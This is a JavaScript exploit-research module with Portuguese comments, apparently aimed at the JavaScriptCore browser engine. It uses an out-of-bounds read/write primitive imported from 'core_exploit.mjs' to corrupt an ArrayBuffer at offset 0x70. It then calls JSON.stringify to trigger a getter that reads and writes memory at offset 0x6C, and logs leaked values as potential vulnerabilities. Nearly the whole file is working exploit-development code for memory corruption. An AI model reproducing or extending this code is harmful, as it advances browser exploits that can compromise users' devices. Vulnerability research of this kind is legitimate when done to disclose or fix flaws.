// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // Certifique-se de que é exportado e não null aqui
    oob_dataview_real,    // Certifique-se de que é exportado e não null aqui
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
// JSC_OFFSETS não é diretamente usado por executeRetypeOOB_AB_Test, mas OOB_CONFIG pode ser usado por core_exploit
import { OOB_CONFIG } from '../config.mjs';

// ============================================================\n// DEFINIÇÕES DE CONSTANTES GLOBAIS DO MÓDULO\n// ============================================================
const FNAME_GETTER_TEST = "executeGetterInteractionTest_v13a";

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterFor0x6CAnalysis";
const CORRUPTION_OFFSET_TRIGGER = 0x70; // Onde a escrita OOB principal ocorre
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
const TARGET_WRITE_OFFSET_0x6C = 0x6C; // O offset que estamos observando e tentando escrever via getter
const OOB_AB_GENERAL_FILL_PATTERN = 0xFEFEFEFE; // Padrão para preencher o buffer

// Padrões para plantar no LOW DWORD de 0x6C
export const LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C = [
    0x11223344,
    0xABABABAB,
    0xCDCDCDCD,
    0xFEFEFEFE,
    0x00000000
];

const MARKER_FOR_GETTER_WRITE_TEST = 0xDEADBEEF; // Valor que o getter tentará escrever

// ============================================================\n// VARIÁVEIS GLOBAIS PARA RESULTADOS DO GETTER\n// ============================================================
let getter_called_flag = false;
let value_read_from_0x6C_in_getter = null;
let getter_write_to_0x6C_success = null;
let error_in_getter = null;

// Função principal exportada (embora runAllAdvancedTestsS3 vá chamar a interna)
export async function sprayAndInvestigateObjectExposure() {
    logS3("sprayAndInvestigateObjectExposure não é o foco deste teste. Usando executeRetypeOOB_AB_Test_Wrapper.", "info", "wrapper");
    // Esta função pode ser deixada vazia ou chamar a estratégia do getter se for a única exportada
    await executeRetypeOOB_AB_Test_Wrapper();
}


export async function executeRetypeOOB_AB_Test(planted_low_dword_val_for_0x6C) {
    logS3(`--- Iniciando ${FNAME_GETTER_TEST} (Sub-teste) ---`, "subtest", FNAME_GETTER_TEST);
    logS3(`Plantando LOW_DWORD ${toHex(planted_low_dword_val_for_0x6C)} em 0x6C (HIGH_DWORD será 0x00000000 inicialmente).`, "info", FNAME_GETTER_TEST);

    // Resetar flags para este sub-teste
    getter_called_flag = false;
    value_read_from_0x6C_in_getter = null;
    getter_write_to_0x6C_success = null;
    error_in_getter = null;

    let results = {
        getter_called: false,
        error_in_getter_msg: null,
        initial_0x6C_qword_in_getter: null,
        did_getter_write_succeed: null,
        value_at_0x6C_after_getter_write: null,
        final_0x6C_value_outside_getter: null
    };

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            logS3("Falha ao inicializar o ambiente OOB.", "critical", FNAME_GETTER_TEST);
            results.error_in_getter_msg = "OOB Init Failed";
            return results;
        }

        // 1. Preencher o oob_array_buffer_real com um padrão conhecido.
        logS3(`Preenchendo oob_array_buffer_real (${OOB_CONFIG.ALLOCATION_SIZE} bytes) com ${toHex(OOB_AB_GENERAL_FILL_PATTERN)}`, "info", FNAME_GETTER_TEST);
        for (let i = 0; i < OOB_CONFIG.ALLOCATION_SIZE / 4; i += 1) {
            // Usar DataView para evitar problemas com Endianness ou AdvancedInt64 para QWORDs
            oob_dataview_real.setUint32(i * 4, OOB_AB_GENERAL_FILL_PATTERN, true);
        }

        // 2. Plantar o valor específico em 0x6C (LOW DWORD) e 0x0 em 0x70 (HIGH DWORD de 0x6C)
        const qword_to_plant_at_0x6C = new AdvancedInt64(planted_low_dword_val_for_0x6C, 0x00000000);
        logS3(`Plantando QWORD ${qword_to_plant_at_0x6C.toString(true)} em oob_buffer[${toHex(TARGET_WRITE_OFFSET_0x6C)}]`, "info", FNAME_GETTER_TEST);
        oob_write_absolute(TARGET_WRITE_OFFSET_0x6C, qword_to_plant_at_0x6C, 8);

        const val_0x6C_before_trigger = oob_read_absolute(TARGET_WRITE_OFFSET_0x6C, 8);
        logS3(`  Verificação: Valor em 0x6C ANTES do trigger: ${val_0x6C_before_trigger.toString(true)}`, "info", FNAME_GETTER_TEST);


        // 3. Configurar o objeto com o getter
        const target_object_for_getter_trigger = {
            get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
                getter_called_flag = true;
                results.getter_called = true;
                logS3(`    >>>> [GETTER ACIONADO para ${GETTER_CHECKPOINT_PROPERTY_NAME}!] <<<<`, "vuln", FNAME_GETTER_TEST);
                try {
                    // Ler o valor de 0x6C de dentro do getter
                    logS3(`    [GETTER]: Lendo QWORD de oob_buffer[${toHex(TARGET_WRITE_OFFSET_0x6C)}]...`, "info", FNAME_GETTER_TEST);
                    const val_0x6C = oob_read_absolute(TARGET_WRITE_OFFSET_0x6C, 8);
                    value_read_from_0x6C_in_getter = val_0x6C;
                    results.initial_0x6C_qword_in_getter = val_0x6C.toString(true);
                    logS3(`    [GETTER]: Valor lido de 0x6C: ${val_0x6C.toString(true)}`, "leak", FNAME_GETTER_TEST);

                    // Tentar escrever no LOW DWORD de 0x6C de dentro do getter
                    logS3(`    [GETTER]: Tentando escrever LOW_DWORD ${toHex(MARKER_FOR_GETTER_WRITE_TEST)} em oob_buffer[${toHex(TARGET_WRITE_OFFSET_0x6C)}]...`, "info", FNAME_GETTER_TEST);
                    // Para escrever apenas o LOW DWORD, precisamos preservar o HIGH DWORD lido.
                    const high_dword_original = val_0x6C.high();
                    const qword_for_getter_write = new AdvancedInt64(MARKER_FOR_GETTER_WRITE_TEST, high_dword_original);
                    oob_write_absolute(TARGET_WRITE_OFFSET_0x6C, qword_for_getter_write, 8);
                    
                    const val_0x6C_after_getter_write_attempt = oob_read_absolute(TARGET_WRITE_OFFSET_0x6C, 8);
                    results.value_at_0x6C_after_getter_write = val_0x6C_after_getter_write_attempt.toString(true);

                    if (val_0x6C_after_getter_write_attempt.low() === MARKER_FOR_GETTER_WRITE_TEST && val_0x6C_after_getter_write_attempt.high() === high_dword_original) {
                        getter_write_to_0x6C_success = true;
                        results.did_getter_write_succeed = true;
                        logS3(`    [GETTER]: SUCESSO ao escrever em 0x6C. Novo valor: ${val_0x6C_after_getter_write_attempt.toString(true)}`, "good", FNAME_GETTER_TEST);
                    } else {
                        getter_write_to_0x6C_success = false;
                        results.did_getter_write_succeed = false;
                        logS3(`    [GETTER]: FALHA ao escrever em 0x6C. Lido: ${val_0x6C_after_getter_write_attempt.toString(true)}, Esperado LOW: ${toHex(MARKER_FOR_GETTER_WRITE_TEST)}`, "error", FNAME_GETTER_TEST);
                    }

                } catch (e) {
                    error_in_getter = e.message;
                    results.error_in_getter_msg = e.message;
                    logS3(`    [GETTER]: ERRO DENTRO DO GETTER: ${e.message}`, "error", FNAME_GETTER_TEST);
                    if (e.stack) logS3(`    [GETTER]: Stack: ${e.stack}`, "error", FNAME_GETTER_TEST);
                }
                return "GetterValuePlaceholder"; // Retornar algo para JSON.stringify
            }
        };

        // 4. Realizar a escrita OOB que é o trigger da corrupção
        logS3(`Realizando escrita OOB (trigger) em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}] com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_GETTER_TEST);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3("Escrita OOB de trigger realizada.", "good", FNAME_GETTER_TEST);

        await PAUSE_S3(100); // Pausa para garantir que a escrita se propague/estabilize se houver efeitos assíncronos

        // 5. Chamar JSON.stringify para acionar o getter
        logS3(`Chamando JSON.stringify para acionar o getter em '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_GETTER_TEST);
        let stringifyResult = "";
        try {
            stringifyResult = JSON.stringify(target_object_for_getter_trigger);
        } catch (e) {
            logS3(`Erro durante JSON.stringify (fora do getter): ${e.message}`, "warn", FNAME_GETTER_TEST);
            // Não necessariamente um erro fatal para o teste do getter se o getter já foi chamado
        }
        logS3(`JSON.stringify concluído. Resultado (pode ser placeholder): ${stringifyResult}`, "info", FNAME_GETTER_TEST);

        // 6. Verificar e logar resultados
        if (!getter_called_flag && !results.getter_called) { // Dupla verificação
            logS3("ALERTA: Getter NÃO foi chamado!", "error", FNAME_GETTER_TEST);
        }
        
        // Ler o valor final de 0x6C de fora do getter para comparação final
        const final_val_0x6C_outside = oob_read_absolute(TARGET_WRITE_OFFSET_0x6C, 8);
        results.final_0x6C_value_outside_getter = final_val_0x6C_outside.toString(true);
        logS3(`Valor final em 0x6C (lido fora do getter após stringify): ${results.final_0x6C_value_outside_getter}`, "info", FNAME_GETTER_TEST);


    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_GETTER_TEST} (sub-teste): ${e.message}`, "critical", FNAME_GETTER_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_GETTER_TEST);
        results.error_in_getter_msg = results.error_in_getter_msg || `Critical error: ${e.message}`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_GETTER_TEST} (Sub-teste) Concluído ---`, "subtest", FNAME_GETTER_TEST);
    }
    return results;
}

// Função wrapper para ser chamada por runAllAdvancedTestsS3
export async function executeRetypeOOB_AB_Test_Wrapper() {
    const FNAME_WRAPPER = "executeRetypeOOB_AB_Test_Wrapper";
    logS3(`==== Iniciando ${FNAME_WRAPPER}: Teste de Interação com Getter em Loop ====`, "test", FNAME_WRAPPER);
    
    for (const pattern of LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C) {
        logS3(`\nRunning sub-test with LOW_DWORD pattern for 0x6C: ${toHex(pattern)}`, "test", FNAME_WRAPPER);
        const sub_results = await executeRetypeOOB_AB_Test(pattern);
        
        logS3(`Resultados para padrão ${toHex(pattern)}:`, "info", FNAME_WRAPPER);
        logS3(`  Getter chamado: ${sub_results.getter_called}`, sub_results.getter_called ? "good" : "error", FNAME_WRAPPER);
        if (sub_results.error_in_getter_msg) {
            logS3(`  Erro no getter: ${sub_results.error_in_getter_msg}`, "error", FNAME_WRAPPER);
        }
        logS3(`  Valor inicial de 0x6C no getter: ${sub_results.initial_0x6C_qword_in_getter || 'N/A'}`, "leak", FNAME_WRAPPER);
        logS3(`  Escrita do getter em 0x6C bem-sucedida: ${sub_results.did_getter_write_succeed === null ? 'N/A' : sub_results.did_getter_write_succeed}`, sub_results.did_getter_write_succeed ? "good" : (sub_results.did_getter_write_succeed === null ? "info" : "error"), FNAME_WRAPPER);
        logS3(`  Valor em 0x6C após tentativa de escrita do getter: ${sub_results.value_at_0x6C_after_getter_write || 'N/A'}`, "leak", FNAME_WRAPPER);
        logS3(`  Valor final em 0x6C (lido fora, após stringify): ${sub_results.final_0x6C_value_outside_getter || 'N/A'}`, "leak", FNAME_WRAPPER);
        
        if (sub_results.getter_called && sub_results.initial_0x6C_qword_in_getter) {
            // Exemplo de condição para "excelente resultado":
            // Se o valor lido em 0x6C no getter for diferente de 0xFFFFFFFF_plantedLOWDWORD
            // ou se a escrita do getter funcionar de forma inesperada.
            const expected_0x6C_in_getter = new AdvancedInt64(pattern, 0xFFFFFFFF).toString(true); // HIGH é FF..FF devido à escrita em 0x70
            if (sub_results.initial_0x6C_qword_in_getter !== expected_0x6C_in_getter) {
                logS3(`    POTENCIAL RESULTADO INTERESSANTE: Valor de 0x6C no getter (${sub_results.initial_0x6C_qword_in_getter}) inesperado! Esperado ~${expected_0x6C_in_getter}`, "vuln", FNAME_WRAPPER);
                document.title = `Getter Test: 0x6C Inesperado com ${toHex(pattern)}!`;
            }
        }
        await PAUSE_S3(200); // Pausa entre os sub-testes
    }
    logS3(`==== ${FNAME_WRAPPER} Concluído ====`, "test", FNAME_WRAPPER);
}
